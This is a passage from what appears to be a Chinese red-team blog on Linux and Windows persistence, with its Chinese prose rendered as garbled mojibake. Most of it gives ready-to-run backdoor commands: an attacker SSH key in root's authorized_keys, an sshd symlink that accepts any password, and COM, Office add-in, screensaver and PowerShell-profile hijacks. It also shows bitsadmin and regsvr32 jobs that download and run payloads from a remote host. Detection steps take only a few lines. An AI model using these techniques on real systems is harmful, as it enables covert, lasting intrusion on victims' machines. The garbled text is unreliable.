<h4 id="å¯ç–‘ç”¨æˆ·æ’æŸ¥"><a href="#å¯ç–‘ç”¨æˆ·æ’æŸ¥" class="headerlink" title="å¯ç–‘ç”¨æˆ·æ’æŸ¥"></a>å¯ç–‘ç”¨æˆ·æ’æŸ¥</h4><h3 id="sshå…¬é’¥æ·»åŠ "><a href="#sshå…¬é’¥æ·»åŠ " class="headerlink" title="sshå…¬é’¥æ·»åŠ "></a>sshå…¬é’¥æ·»åŠ </h3><p>åœ¨æ”»å‡»æœºä»»æ„åœ°æ–¹æ‰§è¡Œ:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -b 4096 -t rsa -C &quot;&quot;</span><br><span class="line"></span><br><span class="line"> -t æŒ‡å®šåŠ å¯†ç®—æ³•ï¼Œä½¿ç”¨ -b è‡ªå®šç”Ÿæˆå¯†é’¥é•¿åº¦ï¼Œä½¿ç”¨ -C æ·»åŠ å¯†é’¥å¯¹çš„è¯´æ˜commentã€‚ç”Ÿæˆçš„å¯†é’¥å¯¹é»˜è®¤å­˜å‚¨åœ¨ç”¨æˆ·ç›®å½•ä¸‹çš„ .ssh ç›®å½•ä¸­ï¼Œç§é’¥é»˜è®¤åç§°ä¸º id_*** (å³ id_ + åŠ å¯†ç®—æ³•åç§°)ã€‚è¿˜å¯ä»¥ä½¿ç”¨ -f æŒ‡å®šç”Ÿæˆçš„ç§é’¥å­˜å‚¨çš„æ–‡ä»¶å…¨è·¯å¾„åç§°ï¼›ä¹Ÿå¯ä»¥ä¸ä½¿ç”¨ -f æŒ‡å®šå¯†é’¥æ–‡ä»¶è·¯å¾„ï¼Œåœ¨å¯†é’¥çš„åˆ›å»ºè¿‡ç¨‹ä¸­è¿˜ä¼šæç¤ºç”¨æˆ·è¾“å…¥å¯†é’¥æ–‡ä»¶å…¨è·¯å¾„åç§°ã€‚ç§é’¥å¯¹åº”çš„å…¬é’¥æ–‡ä»¶ä¸ºç§é’¥æ–‡ä»¶å…¨åç§° + .pubã€‚</span><br></pre></td></tr></table></figure>

<p>å—å®³æœº:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure>
<p>æ”»å‡»è€…çš„id_rsa.pubå†…å®¹ç²˜è´´åˆ°æ–‡ä»¶é‡Œé¢(å¦‚æœåŸæ¥å­˜åœ¨å†…å®¹å°±å¦èµ·ä¸€è¡Œç²˜è´´)</p>
<p>ç„¶åå°±èƒ½åœ¨æ”»å‡»æœºç™»é™†ä¸Šå»äº†:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -i &#x2F;Users&#x2F;mieea&#x2F;.ssh&#x2F;testkey root@10.211.55.12</span><br></pre></td></tr></table></figure>

<h3 id="sshè½¯è¿æ¥"><a href="#sshè½¯è¿æ¥" class="headerlink" title="sshè½¯è¿æ¥"></a>sshè½¯è¿æ¥</h3><p>ç»å…¸åé—¨ï¼Œç›´æ¥å¯¹sshdå»ºç«‹è½¯è¿æ¥ï¼Œä¹‹åç”¨ä»»æ„å¯†ç ç™»å½•å³å¯ã€‚<br>åŸå‘½ä»¤ï¼š<code>ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=12345;</code></p>
<p>åŸç†åˆ†æå®Œæ•´:<a href="https://blackwolfsec.cc/2017/03/24/Linux_ssh_backdoor/">Linuxè½¯è¿æ¥sshåé—¨ä¹‹æˆ‘è§</a><br>æ‘˜è¦ä¸€ä¸‹é‡ç‚¹:<br>åœ¨sshdæœåŠ¡é…ç½®è¿è¡ŒPAMè®¤è¯çš„å‰æä¸‹ï¼ŒPAMé…ç½®æ–‡ä»¶ä¸­æ§åˆ¶æ ‡å¿—ä¸ºsufficientæ—¶åªè¦pam_rootokæ¨¡å—æ£€æµ‹uidä¸º0(root)å³å¯æˆåŠŸè®¤è¯ç™»é™†ã€‚<br>ä¸ºä»€ä¹ˆæ˜¯é€šè¿‡è½¯è¿æ¥çš„æ–¹å¼ï¼Ÿå› ä¸ºPAMè®¤è¯æ˜¯é€šè¿‡è½¯è¿æ¥çš„æ–‡ä»¶å(å¦‚<code>/tmp/su</code>,<code>/home/su</code>)åœ¨<code>/etc/pam.d/</code>ç›®å½•ä¸‹å¯»æ‰¾å¯¹åº”çš„PAMé…ç½®æ–‡ä»¶(å¦‚ï¼š<code>/etc/pam.d/su</code>)<br>ä»»æ„å¯†ç ç™»é™†çš„æ ¸å¿ƒæ˜¯<code>auth sufficient pam_rootok.so</code>ï¼Œåªè¦PAMé…ç½®æ–‡ä»¶ä¸­åŒ…å«æ­¤é…ç½®å³å¯SSHä»»æ„å¯†ç ç™»é™†ï¼Œå®è·µè¡¨æ˜ï¼Œå¯æˆåŠŸåˆ©ç”¨çš„PAMé…ç½®æ–‡ä»¶é™¤äº†suè¿˜æœ‰chshã€chfnã€‚</p>
<h4 id="å®è·µçš„å‘ç‚¹"><a href="#å®è·µçš„å‘ç‚¹" class="headerlink" title="å®è·µçš„å‘ç‚¹"></a>å®è·µçš„å‘ç‚¹</h4><p>CentOS7:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oport&#x3D;12345</span><br></pre></td></tr></table></figure>
<p>è½¯è¿æ¥å»ºç«‹åï¼Œæ–°çš„ç«¯å£é“¾æ¥è¢«æ‹’ç»ã€‚å³<code>-p 22</code>æ˜¯æ­£å¸¸çš„ï¼Œ<code>-p 12345</code>æ‹’ç»è¿æ¥ã€‚<br>æœç´¢åå‘ç°åº”è¯¥å’ŒSELinuxå’Œé˜²ç«å¢™æœ‰å…³ï¼Œè¿›è¡Œä»¥ä¸‹æ“ä½œåå°±èƒ½ä»»æ„å¯†ç ç™»é™†:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">semanage port -a -t ssh_port_t -p tcp 12345</span><br><span class="line">firewall-cmd --permanent --zone&#x3D;public --add-port&#x3D;12345&#x2F;tcp</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>
<p>å‚è€ƒ:<a href="https://github.com/LLLeon/Blog/issues/8">æ›´æ”¹CentOS7é»˜è®¤çš„SSHç«¯å£</a></p>
<p>Ubuntu18.04:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oport&#x3D;12345</span><br></pre></td></tr></table></figure>
<p>å‘½ä»¤æ‰§è¡Œåu111ç”¨æˆ·å¯ä»¥æ­£å¸¸ä»»æ„å¯†ç ç™»é™†ï¼Œä½†rootæ— æ³•ç™»é™†ï¼Œæç¤º<code>Permission denied, please try again.</code>ã€‚<br>ä¿®æ”¹PermitRootLoginä¸ºyesåä¾ç„¶ä¸è¡Œï¼Œæœäº†åŠå¤©ä¹Ÿæœä¸åˆ°è§£å†³æ–¹æ¡ˆï¼Œæš‚æ—¶æ”¾å¼ƒã€‚</p>
<h4 id="æ’æŸ¥-6"><a href="#æ’æŸ¥-6" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h4><p>è¿›ç¨‹å’Œç«¯å£éƒ½èƒ½å‘ç°å¼‚å¸¸: </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -anplt</span><br><span class="line">ps auxf</span><br></pre></td></tr></table></figure>

<h2 id="å‚è€ƒ-2"><a href="#å‚è€ƒ-2" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>[1].<a href="https://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/">linuxå¸¸è§backdooråŠæ’æŸ¥æŠ€æœ¯</a><br>[2].<a href="https://xz.aliyun.com/t/7338">Linuxä¸‹çš„æƒé™ç»´æŒ</a><br>[3].<a href="https://www.freebuf.com/column/162604.html">è­¦æƒ•åˆ©ç”¨Linuxé¢„åŠ è½½å‹æ¶æ„åŠ¨æ€é“¾æ¥åº“çš„åé—¨</a></p>
]]></content>
      <categories>
        <category>websec</category>
      </categories>
      <tags>
        <tag>redteam</tag>
      </tags>
  </entry>
  <entry>
    <title>Windowså•æœºæƒé™ç»´æŒ</title>
    <url>/posts/45439/</url>
    <content><![CDATA[<h1 id="Windowså•æœºæƒé™ç»´æŒ"><a href="#Windowså•æœºæƒé™ç»´æŒ" class="headerlink" title="Windowså•æœºæƒé™ç»´æŒ"></a>Windowså•æœºæƒé™ç»´æŒ</h1><p>å…³é”®ç‚¹ï¼šå…æ€+è‡ªå¯åŠ¨</p>
<h2 id="ç”¨æˆ·æƒé™"><a href="#ç”¨æˆ·æƒé™" class="headerlink" title="ç”¨æˆ·æƒé™"></a>ç”¨æˆ·æƒé™</h2><h3 id="å¿«æ·æ–¹å¼"><a href="#å¿«æ·æ–¹å¼" class="headerlink" title="å¿«æ·æ–¹å¼"></a>å¿«æ·æ–¹å¼</h3><p>å¸¸è§çš„æ¸—é€æ¡†æ¶éƒ½æ”¯æŒå¿«æ·æ–¹å¼çš„ç”Ÿæˆå’Œç§»åŠ¨åˆ°è‡ªå¯åŠ¨ç›®å½•ä¸­ï¼ŒåŸç†å‡ ä¹éƒ½æ˜¯æ”¹å†™å¿«æ·æ–¹å¼çš„<code>target</code>ã€‚<br>è¿˜æœ‰å¾ˆå¤šå…¶ä»–è„šæœ¬å·¥å…·å¯ä»¥å¼€å‘æ¶æ„å¿«æ·æ–¹å¼ã€‚</p>
<h3 id="æ–‡ä»¶æ‰©å±•åé»˜è®¤æ“ä½œ"><a href="#æ–‡ä»¶æ‰©å±•åé»˜è®¤æ“ä½œ" class="headerlink" title="æ–‡ä»¶æ‰©å±•åé»˜è®¤æ“ä½œ"></a>æ–‡ä»¶æ‰©å±•åé»˜è®¤æ“ä½œ</h3><p>Windowsä¸­ï¼Œæ¯ä¸ªæ–‡ä»¶æ‰©å±•åéƒ½ä¸ä¸€ä¸ªé»˜è®¤ç¨‹åºå…³è”ï¼Œå…³è”é€šè¿‡æ³¨å†Œè¡¨å®ç°ã€‚<br>æŒ‡å®šæ‰©å±•åå¤„ç†ç¨‹åºçš„æ³¨å†Œè¡¨æœ‰2å¤„ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_CLASSES_ROOT # Global</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts # Local</span><br></pre></td></tr></table></figure>
<p>ç”¨æˆ·è¯•å›¾æ‰“å¼€æ–‡ä»¶æ—¶ï¼Œå…ˆåœ¨HKEY_USERSæŸ¥æ‰¾æ˜¯å¦å­˜åœ¨æ‰©å±•åæ³¨å†Œè¡¨é¡¹ã€‚å¦‚æœæ²¡æœ‰ï¼Œå†åˆ°HKEY_CLASSES_ROOTæŸ¥æ‰¾ã€‚</p>
<a id="more"></a>
<p>ç¤ºä¾‹ï¼š<br><img src="/images/%E6%89%A9%E5%B1%95%E7%A8%8B%E5%BA%8F%E7%AF%A1%E6%94%B9.png" alt="æ‰©å±•ç¨‹åºç¯¡æ”¹"><br>ProxyAppä¼šå¤„ç†æ‰©å±•ï¼Œåˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹ï¼ŒåŒæ—¶é»˜è®¤ç¨‹åºä¹Ÿä¼šæ­£å¸¸è¿è¡Œï¼Œç”¨æˆ·ä¸ä¼šæ„Ÿå—åˆ°å·®å¼‚ã€‚</p>
<h3 id="comç»„ä»¶åŠ«æŒ"><a href="#comç»„ä»¶åŠ«æŒ" class="headerlink" title="comç»„ä»¶åŠ«æŒ"></a>comç»„ä»¶åŠ«æŒ</h3><p>COM(Component Object Model)å¯ä»¥ç†è§£ä¸ºä¸€å¥—ç»™C/C++ç”¨çš„æ¥å£ï¼Œæˆ–è€…è¯´ä¸€ä¸ªé€šç”¨çš„ABIè§„èŒƒï¼Œåªè¦éµä»è¿™ä¸ªè§„èŒƒï¼Œä¸ç®¡ç”¨ä»€ä¹ˆè¯­è¨€å†™çš„ç¨‹åºéƒ½å¯ä»¥äº’ç›¸è°ƒç”¨ã€‚åŠ«æŒcomç»„ä»¶ä¸éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œå› ä¸ºåœ¨HKCUä¸­æ³¨å†Œçš„ç±»ä¼˜å…ˆçº§é«˜äºHKLMä¸­çš„ã€‚ä½†æœ‰æ—¶ä¼šä»…ä»HKLMä¸­åŠ è½½å¯¹è±¡ï¼Œä»¥é˜²æ­¢ææƒã€‚<br>COMç›¸å…³å¸¸è§æ ‡å¿—ç¬¦ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UUID ï¼š ä»£è¡¨COM</span><br><span class="line">CLSID ï¼š ä»£è¡¨COMç»„ä»¶ä¸­çš„ç±»</span><br><span class="line">IID ï¼šä»£è¡¨COMç»„ä»¶ä¸­çš„æ¥å£</span><br></pre></td></tr></table></figure>
<p>COMè°ƒç”¨è¿‡ç¨‹ï¼šç¼–å†™å¥½ä¸€ä¸ªCOMç»„ä»¶ï¼Œä¸€èˆ¬éƒ½éœ€è¦æ³¨å†Œåˆ°æ³¨å†Œè¡¨ä¸­ï¼Œå½“è°ƒç”¨COMç»„ä»¶çš„è¿™ä¸ªåŠŸèƒ½çš„æ—¶å€™ï¼Œç¨‹åºä¼šè¿›æ³¨å†Œè¡¨è¿›è¡Œè¯»å–ç›¸åº”ä½ç½®çš„DLLæˆ–è€…EXEï¼ŒåŠ è½½åˆ°è¿›ç¨‹è¿˜æ˜¯çº¿ç¨‹ä¸­ä¾›ä½¿ç”¨ã€‚<br>å¸¸è¢«åˆ©ç”¨çš„é”®å€¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">InprocServer&#x2F;InprocServer32 # åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶(dll)çš„è·¯å¾„</span><br><span class="line">LocalServer&#x2F;LocalServer32 # å¯æ‰§è¡Œæ–‡ä»¶(exe)çš„è·¯å¾„</span><br><span class="line">TreatAs</span><br><span class="line">ProgID</span><br></pre></td></tr></table></figure>
<p>è¿™äº›é”®æ‰€åœ¨çš„æ³¨å†Œè¡¨é¡¹ä½ç½®ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Classes\CLSID</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Classes\CLSID</span><br></pre></td></tr></table></figure>
<p>å¸¸ç”¨åŠ«æŒæ‰‹æ³•ï¼š<br>1.å¢åŠ ç¼ºå°‘çš„CLSIDè¿›è¡Œåˆ©ç”¨<br>2.ä¿®æ”¹åŸæœ‰CLSIDåŠ è½½çš„ç¨‹åº<br>3.æ›¿æ¢æ‰CLSIDä¸‹åŠ è½½è·¯å¾„çš„ç¨‹åº</p>
<h4 id="å¯»æ‰¾å¯åŠ«æŒcom-keys"><a href="#å¯»æ‰¾å¯åŠ«æŒcom-keys" class="headerlink" title="å¯»æ‰¾å¯åŠ«æŒcom keys"></a>å¯»æ‰¾å¯åŠ«æŒcom keys</h4><p>1.process monitor(éº»çƒ¦)<br>è¿‡æ»¤è®¾ç½®å¦‚ä¸‹4æ¡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Operation is RegOpenKey</span><br><span class="line">Result is NAME NOT FOUND</span><br><span class="line">Path ends with InprocServer32</span><br><span class="line">Exclude if path starts with HKLM</span><br></pre></td></tr></table></figure>
<p>ç„¶åæ‰“å¼€ä¸€äº›å¸¸ç”¨åº”ç”¨ï¼Œprocess monitorå°±ä¼šæ•è·åˆ°å¯ä»¥ç”¨äºåŠ«æŒçš„ï¼Œå°†ç»“æœå¯¼å‡ºä¸ºCSVæ–‡ä»¶ã€‚<br>å†ä½¿ç”¨<a href="https://github.com/nccgroup/acCOMplice">acCOMplice</a>ç­›é€‰å‡ºæœ€ç»ˆå¯åŠ«æŒã€‚<br>2.åœ¨è®¡åˆ’ä»»åŠ¡ä¸­å¯»æ‰¾<br><a href="https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Get-ScheduledTaskComHandler.ps1">Get-ScheduledTaskComHandler.ps1</a><br>ä½¿ç”¨æ–¹å¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Get-ScheduledTaskComHandler.ps1</span><br><span class="line">Get-ScheduledTaskComHandler -PersistenceLocations</span><br></pre></td></tr></table></figure>

<h4 id="æ— æ–‡ä»¶æ‰§è¡Œ"><a href="#æ— æ–‡ä»¶æ‰§è¡Œ" class="headerlink" title="æ— æ–‡ä»¶æ‰§è¡Œ"></a>æ— æ–‡ä»¶æ‰§è¡Œ</h4><p><code>ScriptletURL</code>é”®å€¼ç”¨äºæŒ‡å®šä»»æ„è¿œç¨‹<code>.sct</code>æ–‡ä»¶urlåœ°å€ã€‚<br><img src="/images/scriptleturl.png" alt="scriptleturl"><br>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œæ¿€æ´»comç±»ï¼ŒåŒæ—¶ä¼šæ‰§è¡Œï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rundll32.exe -sta &#123;AAAA1111-0000-0000-0000-0000FEEDACDC&#125;</span><br></pre></td></tr></table></figure>

<h4 id="InprocServer32"><a href="#InprocServer32" class="headerlink" title="InprocServer32"></a>InprocServer32</h4><p>POC: <a href="https://github.com/3gstudent/COM-Object-hijacking">COM-Object-hijacking</a><br>è¿™ç§åˆ©ç”¨æ–¹å¼å¯¹DLLçš„æ„é€ æœ‰æ‰€è¦æ±‚ã€‚</p>
<h4 id="LocalServer32"><a href="#LocalServer32" class="headerlink" title="LocalServer32"></a>LocalServer32</h4><p>ç¯¡æ”¹åéœ€è¦é€šè¿‡powershellå‘½ä»¤æ¿€æ´»ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;45EAE363-122A-445A-97B6-3DE890E786F8&quot;))</span><br></pre></td></tr></table></figure>

<h4 id="TreatAs-ProgID"><a href="#TreatAs-ProgID" class="headerlink" title="TreatAs/ProgID"></a>TreatAs/ProgID</h4><p>TreatAsæ˜¯ï¼Œå¯ä»¥è¢«ç”¨äºå°†COMå¯¹è±¡é‡å®šå‘åˆ°å¦ä¸€ä¸ªCOMå¯¹è±¡ã€‚<br>step1.åœ¨HKCUæ³¨å†Œåˆ›å»ºæ¶æ„CLSID<br>step2.åœ¨åˆæ³•çš„CLSIDä¸‹æ·»åŠ é”®TreatAsï¼Œå†…å®¹ä¸ºæ¶æ„CLSID<br>ä¸€ä¸ªCLSIDä¼šè¢«ä¸€ä¸ªæˆ–å¤šä¸ªProgIDæ‰€æŒ‡å‘ï¼Œå¯ä»¥ç›´æ¥ç¯¡æ”¹æŒ‡å‘çš„CLSIDã€‚ï¼ˆä½†æˆ‘è§‰å¾—è¿˜æ˜¯æ”¹TreatAsé è°±ï¼‰</p>
<h3 id="office"><a href="#office" class="headerlink" title="officeÂ "></a>officeÂ </h3><h4 id="templates"><a href="#templates" class="headerlink" title="templates"></a>templates</h4><p>Officeä¼šåˆ›å»ºä¸€ä¸ªç”¨äºå­˜æ”¾æ¨¡ç‰ˆçš„æ–‡ä»¶å¤¹ï¼Œæ¯æ¬¡Officeåº”ç”¨æ‰“å¼€æ—¶ä¼šåŠ è½½é»˜è®¤æ¨¡æ¿ã€‚å¦‚æœæŠŠæ¶æ„å®ä»£ç åµŒå…¥åˆ°é»˜è®¤æ¨¡æ¿ä¸­ï¼Œå°±å¯ä»¥åˆ©ç”¨äºæƒé™ç»´æŒã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\zhangsan\AppData\Roaming\Microsoft\Templates</span><br></pre></td></tr></table></figure>

<h4 id="add-ins"><a href="#add-ins" class="headerlink" title="add-ins"></a>add-ins</h4><p>Office add-insæœ¬è´¨ä¸Šæ˜¯DLLæ–‡ä»¶ï¼Œä½†æ ¹æ®åº”ç”¨ç¨‹åºåç¼€æœ‰æ‰€ä¸åŒï¼Œä¾‹å¦‚wordçš„æ˜¯<code>.wll</code>ï¼Œexcelçš„æ˜¯<code>xll</code>ã€‚æ¯æ¬¡åº”ç”¨ç¨‹åºæ‰“å¼€æ—¶éƒ½ä¼šåŠ è½½å…¶å¯¹åº”add-insã€‚<br>é€šè¿‡powershellå‘½ä»¤æŸ¥æ‰¾æ”¾ç½®wordç¨‹åºçš„add-inså­˜æ”¾æ–‡ä»¶å¤¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-ChildItem &quot;hkcu:\Software\Microsoft\Office\16.0\Word\Security\Trusted Locations&quot;</span><br></pre></td></tr></table></figure>
<p>æŸ¥æ‰¾ç»“æœåº”è¯¥ç±»ä¼¼äºï¼š<code>C:\User\Admin\AppData\Roaming\Microsoft\Word\Startup</code><br>å°†æ¶æ„dllæ”¾ç½®åˆ°æ–‡ä»¶å¤¹ä¸‹ï¼Œå¹¶æ ¹æ®åº”ç”¨ç¨‹åºä¿®æ”¹å…¶åç¼€ï¼Œæ¯”å¦‚æ­¤å¤„åº”è¯¥ä¸º<code>hack.wll</code>ã€‚<br>å…·ä½“åˆ©ç”¨å‚ç…§ï¼š<a href="https://github.com/3gstudent/Office-Persistence">Office-Persistence</a></p>
<h4 id="office-test"><a href="#office-test" class="headerlink" title="office test"></a>office test</h4><p>åœ¨å¼€å‘é˜¶æ®µï¼ŒOfficeåº”ç”¨ä¼šä½¿ç”¨Perfé”®æ¥åŠ è½½dllè¿›è¡Œæ€§èƒ½è¯„ä¼°ã€‚å› æ­¤å¯åˆ©ç”¨äºæƒé™ç»´æŒã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf&quot; &#x2F;t REG_SZ &#x2F;d C:\tmp\pentestlab.dll</span><br></pre></td></tr></table></figure>

<h3 id="å±å¹•ä¿æŠ¤ç¨‹åº"><a href="#å±å¹•ä¿æŠ¤ç¨‹åº" class="headerlink" title="å±å¹•ä¿æŠ¤ç¨‹åº"></a>å±å¹•ä¿æŠ¤ç¨‹åº</h3><p>ä¸»è¦æ˜¯å¯¹ä»¥ä¸‹å‡ ä¸ªæ³¨å†Œè¡¨é¡¹çš„ç¯¡æ”¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE</span><br><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive</span><br><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaverIsSecure</span><br><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut</span><br></pre></td></tr></table></figure>
<p>å±å¹•ä¿æŠ¤ç¨‹åºæ˜¯<code>.src</code>å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå› æ­¤ç¯¡æ”¹æ—¶åç¼€å¯ä¿®æ”¹ä¸º<code>.exe</code>ä¹Ÿèƒ½æ­£å¸¸æ‰§è¡Œã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;hkcu\control panel\desktop&quot; &#x2F;v SCRNSAVE.EXE &#x2F;d c:\tmp\pentestlab.exe </span><br><span class="line">reg add &quot;hkcu\control panel\desktop&quot; &#x2F;v SCRNSAVE.EXE &#x2F;d c:\tmp\pentestlab.scr </span><br><span class="line"># cmd</span><br><span class="line"></span><br><span class="line">New-ItemProperty -Path &#39;HKCU:\Control Panel\Desktop\&#39; -Name &#39;SCRNSAVE.EXE&#39; - Value &#39;c:\tmp\pentestlab.exe&#39;</span><br><span class="line">New-ItemProperty -Path &#39;HKCU:\Control Panel\Desktop\&#39; -Name &#39;SCRNSAVE.EXE&#39; - Value &#39;c:\tmp\pentestlab.scr&#39;</span><br><span class="line"># powershell</span><br></pre></td></tr></table></figure>

<p>å®é™…åˆ©ç”¨é—®é¢˜ï¼š<br>1.å½“ç”¨æˆ·å›ç”µè„‘å‰ç»§ç»­æ“ä½œæ—¶â€œå±å¹•ä¿æŠ¤ç¨‹åºâ€ä¸­æ–­ï¼Œå³ä¼šè¯å°†ä¸­æ–­ã€‚<br>2.å±å¹•ä¿æŠ¤ç¨‹åºå¯èƒ½ä¼šè¢«ç»„ç­–ç•¥ç¦ç”¨ã€‚<br>ï¼ˆ3.æ„Ÿè§‰ç°åœ¨ç”¨å±ä¿çš„äººä¸å¤šï¼Ÿ</p>
<h3 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h3><p>Bitsadminåœ¨win7åŠä¹‹åç³»ç»Ÿè‡ªå¸¦ï¼Œå¯ä»¥ç”¨æ¥åˆ›å»ºä¸Šä¼ æˆ–è€…ä¸‹è½½ä»»åŠ¡ï¼Œå¹¶ä¸”å¯ä»¥æŒ‡å®šä¸‹è½½æˆåŠŸä¹‹åè¦è¿›è¡Œä»€ä¹ˆå‘½ä»¤ã€‚<br>ä½œä¸ºåé—¨åˆ©ç”¨ï¼šåˆ›å»ºä¸‹è½½ä»»åŠ¡å¹¶æ‰§è¡Œå‘½ä»¤ã€‚(æ— æ³•è‡ªåŠ¨å¯åŠ¨ï¼Œå¯èƒ½éœ€è¦å’Œåˆ«å¤„è”åŠ¨)<br>ç¤ºä¾‹1ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;create backdoor</span><br><span class="line"># åˆ›å»ºåä¸ºbackdoorçš„job</span><br><span class="line">bitsadmin &#x2F;addfile backdoor &quot;http:&#x2F;&#x2F;10.0.2.21&#x2F;pentestlab.exe&quot;  &quot;C:\tmp\pentestlab.exe&quot;</span><br><span class="line"># æŒ‡å®šä¸‹è½½URLä¸æœ¬åœ°å­˜å‚¨è·¯å¾„</span><br><span class="line">bitsadmin &#x2F;SetNotifyCmdLine backdoor C:\tmp\pentestlab.exe NUL</span><br><span class="line"># æŒ‡å®šjobä¸‹è½½å®Œæˆåæ‰§è¡Œçš„å‘½ä»¤</span><br><span class="line">bitsadmin &#x2F;SetMinRetryDelay &quot;backdoor&quot; 60</span><br><span class="line"># è®¾ç½®é‡è¯•æ—¶é—´é—´éš”</span><br><span class="line">bitsadmin &#x2F;resume backdoor</span><br><span class="line"># è¿è¡Œjob</span><br></pre></td></tr></table></figure>
<p>ç¤ºä¾‹2ï¼Œåˆ©ç”¨regsvr32çš„æ–‡ä»¶ä¸è½åœ°åé—¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;SetNotifyCmdLine backdoor regsvr32.exe &quot;&#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;10.0.2.21:8080&#x2F;FHXSd9.sct scrobj.dll&quot;</span><br><span class="line">bitsadmin &#x2F;resume backdoor</span><br></pre></td></tr></table></figure>

<h4 id="æ’æŸ¥"><a href="#æ’æŸ¥" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;list &#x2F;allusers &#x2F;verbose</span><br></pre></td></tr></table></figure>

<h3 id="powershellé…ç½®æ–‡ä»¶"><a href="#powershellé…ç½®æ–‡ä»¶" class="headerlink" title="powershellé…ç½®æ–‡ä»¶"></a>powershellé…ç½®æ–‡ä»¶</h3><p>powershellé…ç½®æ–‡ä»¶æ˜¯ä¸€ä¸ªç”¨æˆ·è‡ªå®šä¹‰ç¯å¢ƒå¹¶åœ¨ä¼šè¯å¯åŠ¨æ—¶æ‰§è¡Œç‰¹å®šå‘½ä»¤çš„powershellè„šæœ¬ã€‚å¦‚æœç³»ç»Ÿç”¨æˆ·ç»å¸¸ä½¿ç”¨powershellï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨é…ç½®æ–‡ä»¶å®ç°æŒä¹…åé—¨ã€‚<br>ç¤ºä¾‹1ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $profile</span><br><span class="line">Test-Path $profile # éªŒè¯$profileæ–‡ä»¶æ˜¯å¦å­˜åœ¨</span><br><span class="line">New-Item -Path $profile -Type File â€“Force # å¦‚æœä¸å­˜åœ¨åˆ™æ–°åˆ›å»º</span><br><span class="line">$string &#x3D; &#39;Start-Process &quot;C:\tmp\pentestlab.exe&quot;&#39; # æŒ‡å®šåé—¨ç¨‹åºè·¯å¾„</span><br><span class="line">$string | Out-File -FilePath &quot;C:\Users\pentestlab\Documents\WindowsPowerShell\Microsoft.PowerShe</span><br><span class="line">ll_profile.ps1&quot; -Append</span><br></pre></td></tr></table></figure>
<p>ç¤ºä¾‹2ï¼Œæ¯”1éšè”½ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $profile</span><br><span class="line">Test-Path $profile</span><br><span class="line">New-Item -Path $profile -Type File â€“Force</span><br><span class="line">Add-Content $profile &quot;Invoke-Item C:\tmp\launcher.bat&quot;</span><br><span class="line">$string | Out-File -FilePath &quot;C:\Users\pentestlab\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps 1&quot; -Append</span><br></pre></td></tr></table></figure>
<p>ç¤ºä¾‹3ï¼š</p>
